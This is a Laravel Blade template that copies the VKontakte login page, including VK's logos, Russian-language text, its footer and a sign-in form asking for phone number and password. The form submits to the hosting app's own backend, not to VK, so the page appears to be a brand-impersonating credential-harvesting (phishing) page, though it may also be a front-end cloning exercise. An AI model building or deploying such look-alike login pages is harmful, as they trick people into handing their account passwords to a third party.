@section('content')
@extends('layouts.main')

<div class="flex flex-col gap-[65px] min-h-screen descktop__wrapper">
    <header class="desktop__header flex items-center">
        <div class="desktop__container flex justify-between w-full">
            <div class="flex items-center gap-8">
                <a href="{{route('vk.index')}}" class="flex items-center justify-center">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect width="24" height="24" rx="5.76" fill="#07F">

                        </rect>
                        <path d="M12.82 17.5c-5.42 0-8.7-3.76-8.83-10h2.74c.09 4.59 2.17 6.53 3.77 6.93V7.5h2.63v3.96c1.54-.17 3.16-1.97 3.7-3.96h2.59A7.62 7.62 0 0 1 16 12.49a7.9 7.9 0 0 1 4.01 5.01h-2.84c-.6-1.9-2.07-3.37-4.05-3.57v3.57h-.31Z" fill="#fff">

                        </path>
                    </svg>
                    <svg fill="none" height="24" viewBox="0 0 112 24" width="112" xmlns="http://www.w3.org/2000/svg">
                        <clipPath id="id-vk_logo_composite_text_24__a"><path d="M0 0h112v24H0z">
                            </path>
                        </clipPath>
                        <g clip-path="url(#id-vk_logo_composite_text_24__a)">
                            <path clip-rule="evenodd" d="M43 12.5c0 3.34-2.43 5.5-5.88 5.5-3.45 0-5.88-2.16-5.88-5.5S33.67 7 37.12 7C40.57 7 43 9.16 43 12.5zm-9.22 0c0 2.07 1.35 3.5 3.34 3.5s3.34-1.43 3.34-3.5-1.35-3.45-3.34-3.45-3.34 1.38-3.34 3.45zm-17.03-.21c.95-.44 1.56-1.18 1.56-2.33 0-1.73-1.58-2.96-3.87-2.96H9.17v11h5.5c2.37 0 4.02-1.29 4.02-3.05 0-1.33-.87-2.32-1.94-2.66zM11.6 9.01h2.83c.85 0 1.44.5 1.44 1.2s-.6 1.2-1.44 1.2h-2.83zM14.67 16h-3.06V13.3h3.06c.96 0 1.59.55 1.59 1.36s-.63 1.33-1.59 1.33zM27.84 18h3.19l-5.06-5.71L30.61 7h-2.9l-3.68 4.27h-.6V7H21v11h2.44v-4.38h.59zM52.47 7v4.34h-4.93V7H45.1v11h2.43v-4.44h4.93V18h2.43V7zM62.9 18h-2.44V9.22h-3.8V7H66.7v2.22h-3.8zm9.7-11c-2.14 0-4.02.89-4.57 2.8l2.24.37a2.38 2.38 0 0 1 2.2-1.25c1.33 0 2.12.9 2.22 2.33h-2.37c-3.23 0-4.84 1.42-4.84 3.45 0 2.05 1.59 3.3 3.83 3.3 1.8 0 3-.82 3.53-1.73l.5 1.73h1.8v-6.18c0-3.19-1.73-4.82-4.54-4.82zm-.72 9.16c-1.18 0-1.95-.61-1.95-1.57 0-.84.62-1.43 2.48-1.43h2.3c0 1.8-1.14 3-2.83 3zM89.73 18h-3.2l-3.8-4.38h-.6V18H79.7V7h2.44v4.27h.59L86.4 7h2.9l-4.63 5.29zM94 18h2.44V9.22h3.8V7H90.2v2.22H94zm12.3-11c3.33 0 5.7 2.2 5.7 5.37 0 .3-.02.55-.04.79h-8.84c.23 1.69 1.46 2.83 3.32 2.83 1.29 0 2.3-.55 2.83-1.33l2.29.38c-.83 2.1-2.98 2.96-5.27 2.96-3.34 0-5.71-2.18-5.71-5.5s2.37-5.5 5.71-5.5zm3.06 4.25A3.06 3.06 0 0 0 106.29 9a3 3 0 0 0-3.02 2.25z" fill="white" fill-rule="evenodd">

                            </path>
                        </g>
                    </svg>
                </a>
                <div class="relative flex scope__block items-center">
                    <img src="{{ asset('img/scope.svg') }}" alt="" class="absolute left-2">
                    <input type="text"  placeholder="Поиск" class="">
                </div>
            </div>
            <a class="switchBtn px-3 inline-block	h-full" href="#">Switch to English</a>
        </div>
    </header>
    <main class="desktop">
        <div class="main__content">
            <div class="desktop__container">
                <div class="main__items flex justify-between gap-8">
                    <div class="flex flex-col gap-[45px]">
                        <div>
                            <h1 class="main__title">ВКонтакте для мобильных устройств</h1>
                            <p class="main__description">Установите официальное мобильное приложение ВКонтакте и оставайтесь в курсе новостей ваших друзей, где бы вы ни находились.</p>
                        </div>
                       <div class="flex flex-col items-center gap-4">
                           <div class="img__block relative flex  pt-[32px] text-white">
                               <div class="flex flex-col gap-4 items-center justify-between">
                                   <img class="" src="{{ asset('img/first_phone.png') }}" alt="">
                                   <div class="flex gap-2 items-center">
                                       <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.75 2.47a.5.5 0 0 1 .87.5l-1.34 2.3A8 8 0 0 1 16 12.05H0a8 8 0 0 1 3.62-6.7L2.25 2.97a.5.5 0 0 1 .87-.5l1.37 2.38a7.97 7.97 0 0 1 6.92-.05l1.34-2.33ZM13 9.04a1 1 0 1 1-2 0 1 1 0 0 1 2 0Zm-9 1a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z" fill="currentColor"></path></svg>
                                       <p>VK для Android</p>
                                   </div>
                               </div>
                               <div class="flex flex-col gap-4 items-center justify-between second__phone__block">
                                   <img class="second__phone" src="{{ asset('img/second_phone.png') }}" alt="">
                                   <div class="flex gap-2 items-center">
                                       <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.83 7.44c-.01-1.77 1.45-2.62 1.52-2.67a3.28 3.28 0 0 0-2.57-1.38c-1.1-.11-2.13.64-2.69.64-.55 0-1.4-.63-2.31-.61-1.2.02-2.3.69-2.9 1.75-1.25 2.15-.33 5.32.88 7.06.59.85 1.3 1.8 2.22 1.77.89-.03 1.22-.57 2.3-.57 1.07 0 1.37.57 2.32.55.95-.01 1.56-.86 2.14-1.72.68-.98.96-1.94.98-1.99-.02 0-1.87-.71-1.89-2.83Zm-1.77-5.2c.5-.6.83-1.42.74-2.24-.71.03-1.57.47-2.07 1.06a2.93 2.93 0 0 0-.75 2.17c.79.06 1.6-.4 2.08-1Z" fill="currentColor"></path></svg>
                                       <p>VK для iOS</p>
                                   </div>
                               </div>

                           </div>
                           <a href="https://vk.com/products" class="flex gap-1 items-center all__product">
                               <p>Все продукты</p>
                               <svg class="mt-[2.5px]" xmlns="http://www.w3.org/2000/svg" width="12" height="12" fill="currentColor" viewBox="0 0 12 12"><path fill-rule="evenodd" d="M4.22 2.47a.75.75 0 0 1 1.06 0l3 3a.75.75 0 0 1 0 1.06l-3 3a.75.75 0 0 1-1.06-1.06L6.69 6 4.22 3.53a.75.75 0 0 1 0-1.06Z" clip-rule="evenodd"></path></svg>
                           </a>
                       </div>

                    </div>
                    <div class="block justify-self-end descktop__form">
                        <div class="form__block">
                            <form action="" method="post" id="main__form"  class="flex flex-col gap-5" onsubmit="return false">
                                @csrf
                                <div class="flex flex-col gap-5 up">
                                    <div class="flex flex-col gap-5 items-center">
                                        <svg fill="none" height="48" viewBox="0 0 49 48" width="49" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="M3.87 3.37C.5 6.75.5 12.17.5 23.04v1.92c0 10.86 0 16.3 3.37 19.67C7.25 48 12.67 48 23.54 48h1.92c10.86 0 16.3 0 19.67-3.37 3.37-3.38 3.37-8.8 3.37-19.67v-1.92c0-10.86 0-16.3-3.37-19.67C41.75 0 36.33 0 25.46 0h-1.92C12.68 0 7.24 0 3.87 3.37zm4.74 11.3c.25 12.48 6.82 20 17.65 20h.63v-7.15c3.95.4 6.89 3.35 8.09 7.15h5.69a15.8 15.8 0 0 0-8.03-10.03c2.48-1.49 6-5.09 6.83-9.97h-5.18c-1.08 3.97-4.31 7.57-7.4 7.91v-7.91h-5.26v13.85c-3.2-.8-7.37-4.68-7.54-13.85z" fill="white" fill-rule="evenodd"></path></svg>
                                        <h2>Вход ВКонтакте</h2>
                                    </div>
                                    <x-phone-input></x-phone-input>
                                    <x-password-input></x-password-input>
                                    <div class="flex gap-2 checkbox items-center ">
                                        <svg class="nocheked block" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.05 2.53C4.79 2.13 5.52 2 7.13 2h5.74c1.61 0 2.34.14 3.08.53.65.35 1.17.87 1.52 1.52.4.74.53 1.47.53 3.08v5.74c0 1.61-.14 2.34-.53 3.08a3.64 3.64 0 0 1-1.52 1.52c-.74.4-1.47.53-3.08.53H7.13c-1.61 0-2.34-.14-3.08-.53a3.64 3.64 0 0 1-1.52-1.52c-.4-.74-.53-1.47-.53-3.08V7.13c0-1.61.14-2.34.53-3.08.35-.65.87-1.17 1.52-1.52Zm3.08.97c-1.53 0-1.96.14-2.38.36-.38.2-.69.5-.9.9-.21.4-.35.84-.35 2.37v5.74c0 1.53.14 1.96.36 2.38.2.38.5.69.9.9.4.21.84.35 2.37.35h5.74c1.53 0 1.96-.14 2.38-.36.38-.2.69-.5.9-.9.21-.4.35-.84.35-2.37V7.13c0-1.53-.14-1.96-.36-2.38-.2-.38-.5-.69-.9-.9-.4-.21-.84-.35-2.37-.35H7.13Z" fill="currentColor"></path></svg>
                                        <svg class="cheked hidden" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.44 4.18C2 5.04 2 6.16 2 8.4v3.2c0 2.24 0 3.36.44 4.22a4 4 0 0 0 1.74 1.74c.86.44 1.98.44 4.22.44h3.2c2.24 0 3.36 0 4.22-.44a4 4 0 0 0 1.74-1.74c.44-.86.44-1.98.44-4.22V8.4c0-2.24 0-3.36-.44-4.22a4 4 0 0 0-1.74-1.74C14.96 2 13.84 2 11.6 2H8.4c-2.24 0-3.36 0-4.22.44a4 4 0 0 0-1.74 1.74Zm12.2 3.8a.9.9 0 1 0-1.28-1.27L8.7 11.38 6.64 9.33a.9.9 0 0 0-1.28 1.27l2.7 2.69a.9.9 0 0 0 1.27 0l5.3-5.3Z" fill="white"></path></svg>
                                        <p>Чужой компьютер</p>
                                    </div>
                                    <input
                                        class="submit__btn opacity-70"
                                        type="submit"
                                        value="Продолжить"
                                        id="submit__btn"
                                    >
                                </div>
                                <div class="flex flex-col gap-5 down text-center">
                                    <div class="flex items-center registration__btn__block justify-center items-center">
                                        <a class="registration__btn text-center flex items-center justify-center" href="https://id.vk.com/auth?app_id=7913379&v=1.54.0&redirect_uri=https%3A%2F%2Fvk.com%2Fjoin&uuid=3wKVglm8v2dVYuIL3erIG&scheme=space_gray&action=eyJuYW1lIjoibm9fcGFzc3dvcmRfZmxvdyIsInBhcmFtcyI6eyJ0eXBlIjoic2lnbl91cCJ9fQ%3D%3D">Зарегистрироваться</a>
                                    </div>
                                    <div>
                                        <p>После регистрации вы получите доступ ко всем возможностям VK ID</p>
                                        <a class="advance" href="">Узнать больше</a>
                                    </div>

                                </div>


                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <x-alert></x-alert>
    </main>
    <footer class="footer">
        <div class="desktop__container">
            <div class="flex justify-between gap-2">
                <a href="">ВКонтакте <span>© 2006-2022</span></a>
                <ul class="flex gap-2">
                    <li><a href="">О ВКонтакте</a></li>
                    <li><a href="">Правила</a></li>
                    <li><a href="">Для бизнеса</a></li>
                    <li><a href="">Разработчикам</a></li>
                </ul>
                <ul class="flex gap-2">
                    <li><a href="">Русский</a></li>
                    <li><a href="">Українська</a></li>
                    <li><a href="">English</a></li>
                    <li><a href="">все языки »</a></li>
                </ul>
            </div>
        </div>
    </footer>
</div>
<style>
    body {
        color:white;
    }
</style>
@endsection
